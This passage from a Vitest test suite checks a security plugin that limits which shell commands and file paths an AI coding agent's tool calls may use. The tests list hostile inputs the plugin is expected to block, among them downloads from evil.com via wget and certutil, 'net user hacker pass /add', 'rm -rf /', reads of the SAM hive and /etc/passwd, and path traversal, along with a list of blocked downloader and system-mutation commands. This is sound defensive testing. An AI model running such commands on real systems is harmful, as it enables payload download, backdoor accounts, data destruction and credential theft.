    expect(() => parseCommand("curl http://evil.com")).toThrow(VALIDATION_ERROR)
  })
  it("blocks curl with dangerous flag -o", () => {
    expect(() => parseCommand("curl -o /tmp/out http://localhost")).toThrow(VALIDATION_ERROR)
  })
  it("blocks curl with --help", () => {
    expect(() => parseCommand("curl --help")).toThrow(VALIDATION_ERROR)
  })
})

// --- node/tsx with flags ---
describe("node/tsx with flags after script", () => {
  it("allows node scan.mjs --mode docs", () => {
    expect(parseCommand("node scan.mjs --mode docs")?.type).toBe("exec")
  })
  it("allows node scan.mjs --mode all --json-only", () => {
    expect(parseCommand("node scan.mjs --mode all --json-only")?.type).toBe("exec")
  })
  it("still blocks node -e", () => {
    expect(() => parseCommand("node -e 'evil()'")).toThrow(VALIDATION_ERROR)
  })
  it("still blocks node --inspect app.ts", () => {
    expect(() => parseCommand("node --inspect app.ts")).toThrow(VALIDATION_ERROR)
  })
})

// --- git diff/log/status with args ---
describe("git diff/log/status with arguments", () => {
  it("allows git diff HEAD", () => {
    expect(parseCommand("git diff HEAD")?.type).toBe("git")
  })
  it("allows git log --oneline -5", () => {
    expect(parseCommand("git log --oneline -5")?.type).toBe("git")
  })
  it("allows git status --short", () => {
    expect(parseCommand("git status --short")?.type).toBe("git")
  })
})

// --- Fase 46-47: Non-existent path fallback (resolved prefix) ---
describe("createPathValidator non-existent path fallback", () => {
  const isInside = createPathValidator(__dirname)

  it("allows deeply nested non-existent paths inside project", () => {
    expect(isInside("a/b/c/d/e/f/g/new-file.ts")).toBe(true)
    expect(isInside("./deep/nested/nonexistent/dir/")).toBe(true)
  })

  it("still blocks non-existent paths with .. outside project", () => {
    expect(isInside("../../../../etc/passwd")).toBe(false)
    expect(isInside("valid/../../outside/file.txt")).toBe(false)
  })

  it("still blocks absolute paths outside project", () => {
    expect(isInside("C:\\Windows\\System32")).toBe(false)
    expect(isInside("C:\\")).toBe(false)
  })

  it("still blocks empty, dot-only paths", () => {
    expect(isInside("")).toBe(false)
    expect(isInside(".")).toBe(false)
    expect(isInside("..")).toBe(false)
  })

  it("still blocks UNC paths", () => {
    expect(isInside("\\\\server\\share\\file")).toBe(false)
  })

  it("still allows existing files inside project", () => {
    expect(isInside(__filename)).toBe(true)
    expect(isInside(__dirname)).toBe(true)
  })
})

// --- pnpm test ---
describe("pnpm test command", () => {
  it("recognizes pnpm test", () => {
    expect(parseCommand("pnpm test")?.type).toBe("pnpm-test")
  })
})

// --- Vitest from node_modules/.bin ---
describe("vitest-run from node_modules/.bin", () => {
  const ok = (cmd: string) =>
    it(cmd, () => expect(parseCommand(cmd)?.type).toBe("vitest-run"))

  ok("vitest run")
  ok("vitest run --reporter verbose")
  ok(".\\node_modules\\.bin\\vitest run")
  ok(".\\node_modules\\.bin\\vitest.CMD run")
  ok(".\\node_modules\\.bin\\vitest.ps1 run")
  ok(".\\node_modules\\.bin\\vitest run --reporter json")
})

// --- Script extension validation ---
describe("script extension validation", () => {
  it("allows .ts", () => { expect(VALID_SCRIPT_EXT.test("script.ts")).toBe(true) })
  it("allows .js", () => { expect(VALID_SCRIPT_EXT.test("script.js")).toBe(true) })
  it("allows .tsx", () => { expect(VALID_SCRIPT_EXT.test("script.tsx")).toBe(true) })
  it("allows .mjs", () => { expect(VALID_SCRIPT_EXT.test("script.mjs")).toBe(true) })
  it("allows .cjs", () => { expect(VALID_SCRIPT_EXT.test("script.cjs")).toBe(true) })
  it("blocks .exe", () => { expect(VALID_SCRIPT_EXT.test("script.exe")).toBe(false) })
  it("blocks .bat", () => { expect(VALID_SCRIPT_EXT.test("script.bat")).toBe(false) })
  it("blocks .ps1", () => { expect(VALID_SCRIPT_EXT.test("script.ps1")).toBe(false) })
  it("blocks .sh", () => { expect(VALID_SCRIPT_EXT.test("script.sh")).toBe(false) })
  it("blocks .dll", () => { expect(VALID_SCRIPT_EXT.test("script.dll")).toBe(false) })
})

describe("dangerous extension detection", () => {
  it("detects .exe as dangerous", () => { expect(DANGEROUS_SCRIPT_EXT.test("evil.exe")).toBe(true) })
  it("detects .com as dangerous", () => { expect(DANGEROUS_SCRIPT_EXT.test("evil.com")).toBe(true) })
  it("detects .bat as dangerous", () => { expect(DANGEROUS_SCRIPT_EXT.test("script.bat")).toBe(true) })
  it("detects .ps1 as dangerous", () => { expect(DANGEROUS_SCRIPT_EXT.test("script.ps1")).toBe(true) })
  it("detects .sh as dangerous", () => { expect(DANGEROUS_SCRIPT_EXT.test("script.sh")).toBe(true) })
  it("detects .dll as dangerous", () => { expect(DANGEROUS_SCRIPT_EXT.test("lib.dll")).toBe(true) })
  it("allows .ts as safe", () => { expect(DANGEROUS_SCRIPT_EXT.test("script.ts")).toBe(false) })
  it("allows .mjs as safe", () => { expect(DANGEROUS_SCRIPT_EXT.test("script.mjs")).toBe(false) })
})

// --- Redirecionamento de saída ---
describe("extractRedirectTargets", () => {
  it("extracts a simple redirect target", () => {
    expect(extractRedirectTargets("echo hi > out.txt")).toContain("out.txt")
  })

  it("extracts append and stderr redirect targets", () => {
    expect(extractRedirectTargets("echo hi >> out.txt")).toContain("out.txt")
    expect(extractRedirectTargets("cmd 2> err.log")).toContain("err.log")
  })

  it("extracts quoted redirect targets", () => {
    expect(extractRedirectTargets('echo hi > "my file.txt"')).toContain("my file.txt")
  })

  it("extracts input redirect targets", () => {
    expect(extractRedirectTargets("wc -l < in.txt")).toContain("in.txt")
  })

  it("ignores file descriptor duplication", () => {
    expect(extractRedirectTargets("npm run build 2>&1")).toEqual([])
    expect(extractRedirectTargets("npm run build &> out.txt")).toEqual(["out.txt"])
  })

  it("finds out-of-scope redirect targets", () => {
    const inScope = createScopeValidator(__dirname)
    const outOfScope = (cmd: string) => extractRedirectTargets(cmd).some((p) => !inScope(p))
    expect(outOfScope("echo hi > C:\\outside.txt")).toBe(true)
    expect(outOfScope("echo hi > ..\\..\\escaped.txt")).toBe(true)
    expect(outOfScope("echo hi > out.txt")).toBe(false)
  })
})

// --- Paths escondidos em payloads entre aspas ---
describe("extractEmbeddedPaths", () => {
  it("finds absolute paths inside a quoted payload", () => {
    expect(extractEmbeddedPaths('powershell -c "Get-Content C:\\Windows\\win.ini"')).toContain(
      "C:\\Windows\\win.ini"
    )
  })

  it("finds parent traversal inside a quoted payload", () => {
    expect(extractEmbeddedPaths('bash -c "cat ../../secret"')).toContain("../../secret")
  })

  it("finds UNC paths", () => {
    expect(extractEmbeddedPaths('type "\\\\server\\share\\file.txt"')).toContain("\\\\server\\share\\file.txt")
  })

  it("finds the root slash inside a quoted payload", () => {
    expect(extractEmbeddedPaths('bash -c "rm -rf /"')).toContain("/")
  })

  it("ignores relative and package paths", () => {
    expect(extractEmbeddedPaths("npx playwright test tests/e2e/login.spec.ts")).toEqual([])
    expect(extractEmbeddedPaths("pnpm --filter @brkroutnxdle/api exec tsx scripts/seed.ts")).toEqual([])
  })

  it("ignores http urls", () => {
    expect(extractEmbeddedPaths("curl http://localhost:3000/health")).toEqual([])
  })

  it("does not treat the commit message as a path", () => {
    expect(extractEmbeddedPaths("git commit -m 'fix: handle C:\\Windows paths'")).toEqual([])
  })

  it("still finds paths outside the commit message", () => {
    expect(extractEmbeddedPaths("git commit -m 'msg' C:\\Windows\\x")).toContain("C:\\Windows\\x")
  })

  it("strips free text flag values", () => {
    expect(stripFreeTextValues("git commit -m C:\\Windows\\x")).not.toContain("C:\\Windows\\x")
    expect(stripFreeTextValues("git commit --message=C:\\Windows\\x")).not.toContain("C:\\Windows\\x")
  })
})

// --- Comandos fora da allowlist ---
describe("blockedCommandTypes", () => {
  it("blocks payload downloaders", () => {
    for (const t of [
      "wget",
      "invoke-webrequest",
      "invoke-restmethod",
      "certutil",
      "bitsadmin",
      "start-bitstransfer",
      "mshta",
      "rundll32",
      "scp",
    ]) {
      expect(blockedCommandTypes.has(t)).toBe(true)
    }
  })

  it("blocks system state mutation", () => {
    for (const t of [
      "reg",
      "net",
      "netsh",
      "sc",
      "taskkill",
      "stop-process",
      "start-process",
      "takeown",
      "icacls",
      "diskpart",
      "shutdown",
    ]) {
      expect(blockedCommandTypes.has(t)).toBe(true)
    }
  })

  it("keeps allowlisted commands usable", () => {
    for (const t of ["curl", "cp", "mv", "git", "echo", "node", "tsx", "python", "bash"]) {
      expect(blockedCommandTypes.has(t)).toBe(false)
    }
  })
})

// --- Código inline em interpretadores ---
describe("hasInlineEval", () => {
  it("flags shell interpreters with inline code", () => {
    expect(hasInlineEval(tokenize('bash -c "rm -rf /"'))).toBe(true)
    expect(hasInlineEval(tokenize("cmd /c dir C:\\Windows"))).toBe(true)
    expect(hasInlineEval(tokenize('powershell -c "Get-Content x"'))).toBe(true)
  })

  it("flags scripting interpreters with inline code", () => {
    expect(hasInlineEval(tokenize('python -c "import os"'))).toBe(true)
    expect(hasInlineEval(tokenize("node -e 'process.exit()'"))).toBe(true)
    expect(hasInlineEval(tokenize("ruby -e 'puts 1'"))).toBe(true)
  })

  it("allows interpreters running script files", () => {
    expect(hasInlineEval(tokenize("python scripts/analyze.py"))).toBe(false)
    expect(hasInlineEval(tokenize("bash scripts/setup.sh"))).toBe(false)
    expect(hasInlineEval(tokenize("tsx src/index.ts"))).toBe(false)
  })

  it("ignores other commands with flags", () => {
    expect(hasInlineEval(tokenize("npm run build"))).toBe(false)
    expect(hasInlineEval(tokenize("vitest run -t login"))).toBe(false)
  })

  it("normalizes the executable name", () => {
    expect(baseCommandName(".\\wget.exe")).toBe("wget")
    expect(baseCommandName('"C:\\tools\\python.exe"')).toBe("python")
    expect(baseCommandName("TaskKill")).toBe("taskkill")
  })

  it("sees through launcher prefixes", () => {
    expect(hasInlineEval(tokenize('npx python -c "import os"'))).toBe(true)
    expect(hasInlineEval(tokenize('pnpm exec python -c "import os"'))).toBe(true)
    expect(hasInlineEval(tokenize("npx tsc --noEmit"))).toBe(false)
    expect(baseCommandName(resolveCommandSlice(tokenize("pnpm exec python -c x"))[0])).toBe("python")
    expect(resolveCommandSlice(tokenize("npm run build"))[0]).toBe("npm")
  })
})

// --- Escopo dos paths em script runners ---
describe("scopedRunnerTypes", () => {
  const inScope = createScopeValidator(__dirname)
  const outOfScope = (cmd: string) => collectPathArgs(tokenize(cmd)).some((p) => !inScope(p))

  it("covers script runners", () => {
    expect(scopedRunnerTypes.has("npx-playwright")).toBe(true)
    expect(scopedRunnerTypes.has("vitest-run")).toBe(true)
    expect(scopedRunnerTypes.has("pnpm-run")).toBe(true)
    expect(scopedRunnerTypes.has("pnpm-exec")).toBe(true)
    expect(scopedRunnerTypes.has("pnpm-pw-check")).toBe(false)
  })

  it("blocks outside paths passed to runners", () => {
    expect(outOfScope("npx playwright test --config C:\\outside\\pw.config.ts")).toBe(true)
    expect(outOfScope("pnpm --filter @brkroutnxdle/api exec tsx C:\\outside\\evil.ts")).toBe(true)
    expect(outOfScope("vitest run ..\\..\\outside\\test.ts")).toBe(true)
  })

  it("allows runner paths inside the project", () => {
    expect(outOfScope("npx playwright test tests/e2e/login.spec.ts")).toBe(false)
    expect(outOfScope("pnpm --filter @brkroutnxdle/api exec tsx scripts/seed.ts")).toBe(false)
    expect(outOfScope("vitest run plugins/secure-access.test.ts")).toBe(false)
    expect(outOfScope("pnpm run build")).toBe(false)
  })

  it("exempts echo and the monorepo pw check from the embedded scan", () => {
    expect(embeddedScanExemptTypes.has("echo")).toBe(true)
    expect(embeddedScanExemptTypes.has("pnpm-pw-check")).toBe(true)
  })
})

// --- Encadeamento com & simples ---
describe("hasChaining (single ampersand)", () => {
  it("detects single & chaining", () => {
    expect(hasChaining("echo a & echo b")).toBe(true)
  })

  it("detects & after a command with args", () => {
    expect(hasChaining("npm run build & echo done")).toBe(true)
  })

  it("allows file descriptor duplication", () => {
    expect(hasChaining("npm run build 2>&1")).toBe(false)
    expect(hasChaining("npm run build &> out.txt")).toBe(false)
    expect(hasChaining("echo hi 1>&2")).toBe(false)
  })

  it("allows & inside quotes", () => {
    expect(hasChaining('echo "a & b"')).toBe(false)
  })

  it("still allows simple commands", () => {
    expect(hasChaining("npm run build")).toBe(false)
    expect(hasChaining("git commit -m 'feat: a & b'")).toBe(false)
  })
})

// --- Escopo de cp/mv (shell) ---
describe("scope validation: cp/mv", () => {
  const inScope = createScopeValidator(__dirname)
  // o handler usa parsed.args[0] (a cauda após o nome do comando)
  const copyPaths = (cmd: string) => collectPathArgs(tokenize(cmd).slice(1)).slice(0, 2)

  it("allows copies inside the project", () => {
    expect(copyPaths("cp src/a.txt src/b.txt").every((p) => inScope(p))).toBe(true)
    expect(copyPaths("mv -f src/a.txt src/b.txt").every((p) => inScope(p))).toBe(true)
  })

  it("blocks a destination outside the project", () => {
    expect(copyPaths("cp src/a.txt C:\\outside\\b.txt").some((p) => !inScope(p))).toBe(true)
    expect(copyPaths("mv src/a.txt ..\\..\\b.txt").some((p) => !inScope(p))).toBe(true)
  })
})

// --- Testes do hook real (SecureAccessPlugin / tool.execute.before) ---
// As suítes acima replicam a lógica; aqui o hook é exercitado de verdade,
// para que uma refatoração no wiring não passe despercebida.

const createHook = async (dir: string = __dirname) => {
  const hooks = (await SecureAccessPlugin({
    project: {},
    client: {},
    $: () => {},
    directory: dir,
    worktree: undefined,
  } as never)) as Record<string, (input: unknown, output: unknown) => Promise<void>>
  return hooks["tool.execute.before"]
}

const runBash = async (command: string): Promise<boolean> => {
  const hook = await createHook()
  try {
    await hook({ tool: "bash" }, { args: { command } })
    return true
  } catch {
    return false
  }
}

const runTool = async (tool: string, args: Record<string, unknown>): Promise<boolean> => {
  const hook = await createHook()
  try {
    await hook({ tool }, { args })
    return true
  } catch {
    return false
  }
}

const expectAllowed = async (commands: string[]) => {
  for (const c of commands) {
    expect(await runBash(c), `deveria liberar: ${c}`).toBe(true)
  }
}

const expectBlocked = async (commands: string[]) => {
  for (const c of commands) {
    expect(await runBash(c), `deveria bloquear: ${c}`).toBe(false)
  }
}

describe("hook: allowlist não pode regredir", () => {
  it("libera comandos legítimos", async () => {
    await expectAllowed([
      "git status",
      "git add .",
      "git add src/app.ts",
      "git commit -m 'feat: add login'",
      "git commit -m \"fix: handle C:\\Windows paths\"",
      "git checkout -b feature/login",
      "git push origin main",
      "npm run build",
      "pnpm install",
      "pnpm --filter frontend build",
      "pnpm --filter backend exec tsx ../frontend/playwright-check.ts",
      "pnpm --filter @brkroutnxdle/api exec tsx scripts/seed.ts",
      "npx playwright test tests/e2e/login.spec.ts",
      "npx vitest run plugins/secure-access.test.ts",
      "vitest run",
      "npx tsx scripts/check.ts",
      "node scripts/build.js",
      "tsx src/index.ts",
      "python scripts/analyze.py",
      "bash scripts/setup.sh",
      "ls .",
      "ls -la",
      "cat package.json",
      "cat .",
      "Get-Content package.json",
      "Test-Path .",
      "cp src/a.txt src/b.txt",
      "mv -f src/a.txt src/b.txt",
      "echo hello world",
      'echo "a > b"',
      "echo test > out.txt",
      "npm run build 2>&1",
      "npm run build &> out.txt",
      "curl http://localhost:3000/health",
      "Stop-Process -Name node -Force",
      "taskkill /F /IM node.exe",
      "docker compose up",
      "cd packages/api",
    ])
  })
})

describe("hook: escapes de escopo", () => {
  it("bloqueia leitura fora da pasta", async () => {
    await expectBlocked([
      "cat C:\\Windows\\System32\\drivers\\etc\\hosts",
      "type C:\\Windows\\win.ini",
      "ls C:\\Windows",
      "Get-Content ..\\..\\outside.txt",
      "Get-ChildItem C:\\",
      "Test-Path C:\\Windows",
    ])
  })

  it("bloqueia paths de git fora da pasta", async () => {
    await expectBlocked(["git add ../../outside/file.ts", "git restore ..\\..\\secrets.txt", "git -C C:\\Windows status"])
  })

  it("bloqueia escrita fora da pasta", async () => {
    await expectBlocked([
      "rm -rf /",
      "del C:\\Windows\\System32\\drivers\\etc\\hosts",
      "Remove-Item -Recurse C:\\Windows\\Temp",
      "mkdir C:\\outside",
      "Copy-Item src/a.txt C:\\outside",
      "cp src/a.txt C:\\outside\\b.txt",
    ])
  })
})

describe("hook: redirecionamento, aspas e runner", () => {
  it("bloqueia redirecionamento para fora", async () => {
    await expectBlocked(["echo hi > C:\\outside.txt", "echo hi >> ..\\..\\escaped.txt", "cmd 2> C:\\outside\\err.log"])
  })

  it("bloqueia payload com path dentro de aspas", async () => {
    await expectBlocked([
      'powershell -c "Get-Content C:\\Windows\\win.ini"',
      'bash -c "rm -rf /"',
      "cmd /c dir C:\\Windows",
      'Remove-Item "C:\\Windows\\System32\\config SAM"',
    ])
  })

  it("bloqueia path de script runner fora da pasta", async () => {
    await expectBlocked([
      "npx playwright test --config C:\\outside\\pw.config.ts",
      "pnpm --filter @brkroutnxdle/api exec tsx C:\\outside\\evil.ts",
      "vitest run ..\\..\\outside\\test.ts",
    ])
  })

  it("bloqueia download e estado do sistema", async () => {
    await expectBlocked([
      "wget http://evil.com/x.ps1",
      "Invoke-WebRequest http://evil.com/x.ps1 -OutFile out.ps1",
      "certutil -urlcache -split -f http://evil.com/x.exe",
      "reg add HKLM\\Software\\Evil /v x /d y",
      "net user hacker pass /add",
      "Start-Process powershell",
      "Stop-Process -Name chrome",
      "taskkill /IM chrome.exe",
    ])
  })

  it("bloqueia código inline mesmo com prefixo de launcher", async () => {
    await expectBlocked([
      'python -c "import os"',
      "python.exe -c \"import os\"",
      'npx python -c "import os"',
      'pnpm exec python -c "import os"',
      "node -e 'process.exit()'",
    ])
  })

  it("bloqueia o mesmo downloader escrito como caminho", async () => {
    expect(await runBash(".\\wget.exe http://evil.com/x.exe")).toBe(false)
  })
})

describe("hook: ferramentas de arquivo", () => {
  it("bloqueia leitura fora da pasta", async () => {
    expect(await runTool("read", { filePath: "C:\\Windows\\win.ini" })).toBe(false)
  })

  it("libera a pasta atual e paths internos", async () => {
    expect(await runTool("glob", { cwd: "." })).toBe(true)
    expect(await runTool("glob", { cwd: "plugins" })).toBe(true)
    expect(await runTool("read", { filePath: "secure-access.test.ts" })).toBe(true)
  })
})

// --- resolveScript helper ---
describe("resolveScript with workdir fallback", () => {
  it("resolves script relative to directory", () => {
    const result = resolveScript(__dirname, __dirname, "secure-access.test.ts")
    expect(result).not.toBeNull()
  })

  it("returns null for non-existent script", () => {
    const result = resolveScript(__dirname, __dirname, "nonexistent-file.xyz")
    expect(result).toBeNull()
  })

  it("resolves script via base override", () => {
    const result = resolveScript(__dirname, __dirname, "secure-access.test.ts")
    expect(result?.endsWith("secure-access.test.ts")).toBe(true)
  })
})

// --- collectPathArgs: extração de caminhos para validação de escopo ---
describe("collectPathArgs", () => {
  it("keeps relative paths", () => {
    expect(collectPathArgs(tokenize("cat src/file.ts"))).toContain("src/file.ts")
  })

  it("keeps glob patterns", () => {
    expect(collectPathArgs(tokenize("rm -rf src/**/*.ts"))).toContain("src/**/*.ts")
  })

  it("treats /etc/passwd as an absolute path, not a flag", () => {
    expect(collectPathArgs(["cat", "/etc/passwd"])).toContain("/etc/passwd")
  })

  it("treats the root path as an absolute path", () => {
    expect(collectPathArgs(["rm", "-rf", "/"])).toContain("/")
  })

  it("treats UNC paths as absolute paths", () => {
    expect(collectPathArgs(["cat", "\\\\server\\share\\file.txt"])).toContain("\\\\server\\share\\file.txt")
  })

  it("ignores single-segment slash flags", () => {
    const paths = collectPathArgs(["taskkill", "/F", "/IM", "node.exe"])
    expect(paths).not.toContain("/F")
    expect(paths).not.toContain("/IM")
    expect(paths).toContain("node.exe")
  })

  it("skips the commit message value", () => {
    const paths = collectPathArgs(tokenize("git commit -m 'handle C:\\Windows paths'"))
    expect(paths).not.toContain("handle C:\\Windows paths")
  })

  it("still validates paths that follow the message flag", () => {
    expect(collectPathArgs(["git", "commit", "-m", "msg", "src/file.ts"])).toContain("src/file.ts")
  })
})

// --- Escopo dos comandos de leitura ---
describe("scope validation: read commands", () => {
  const inScope = createScopeValidator(__dirname)
  const outOfScope = (cmd: string) => collectPathArgs(tokenize(cmd)).some(p => !inScope(p))

  it("covers every read command type", () => {
    for (const t of ["cat", "type", "ls", "get-content", "get-childitem", "test-path"]) {
      expect(readCommandTypes.has(t)).toBe(true)
    }
  })

  it("blocks cat outside the project", () => {
    expect(outOfScope("cat C:\\Windows\\System32\\drivers\\etc\\hosts")).toBe(true)
  })

  it("blocks type outside the project", () => {
    expect(outOfScope("type C:\\Windows\\win.ini")).toBe(true)
  })

  it("blocks ls outside the project", () => {
    expect(outOfScope("ls C:\\Windows")).toBe(true)
  })

  it("blocks Get-Content outside the project", () => {
    expect(outOfScope("Get-Content ..\\..\\outside.txt")).toBe(true)
    expect(outOfScope("Get-Content C:\\Windows\\System32\\config\\SAM")).toBe(true)
  })

  it("blocks Get-ChildItem outside the project", () => {
    expect(outOfScope("Get-ChildItem C:\\")).toBe(true)
  })

  it("blocks Test-Path outside the project", () => {
    expect(outOfScope("Test-Path C:\\Windows")).toBe(true)
  })

  it("allows files inside the project", () => {
    expect(outOfScope("cat secure-access.test.ts")).toBe(false)
    expect(outOfScope("Get-Content plugins/secure-access.plugin.ts")).toBe(false)
  })

  it("allows the current folder marker", () => {
    expect(outOfScope("ls .")).toBe(false)
    expect(outOfScope("Test-Path .")).toBe(false)
  })
})

// --- Escopo dos argumentos de path do git ---
describe("scope validation: git path arguments", () => {
  const inScope = createScopeValidator(__dirname)
  const outOfScope = (cmd: string) => collectPathArgs(tokenize(cmd)).some(p => !inScope(p))

  it("blocks git add outside the project", () => {
    expect(outOfScope("git add ../../outside/file.ts")).toBe(true)
    expect(outOfScope("git add ..\\..\\outside\\file.ts")).toBe(true)
  })

  it("blocks git restore outside the project", () => {
    expect(outOfScope("git restore ..\\..\\secrets.txt")).toBe(true)
  })

  it("blocks git -C outside the project", () => {
    expect(outOfScope("git -C C:\\Windows status")).toBe(true)
  })

  it("allows git add . and project refs", () => {
    expect(outOfScope("git add .")).toBe(false)
    expect(outOfScope("git add src/file.ts")).toBe(false)
    expect(outOfScope("git restore src/file.ts")).toBe(false)
  })

  it("allows branch and remote names", () => {
    expect(outOfScope("git checkout main")).toBe(false)
    expect(outOfScope("git checkout -b feature/login")).toBe(false)
    expect(outOfScope("git push origin main")).toBe(false)
  })

  it("does not treat the commit message as a path", () => {
    expect(outOfScope("git commit -m 'fix: handle C:\\Windows paths'")).toBe(false)
  })

  it("blocks out-of-scope paths hidden after the message flag", () => {
    expect(outOfScope("git commit -m msg ..\\..\\outside.txt")).toBe(true)
  })
})
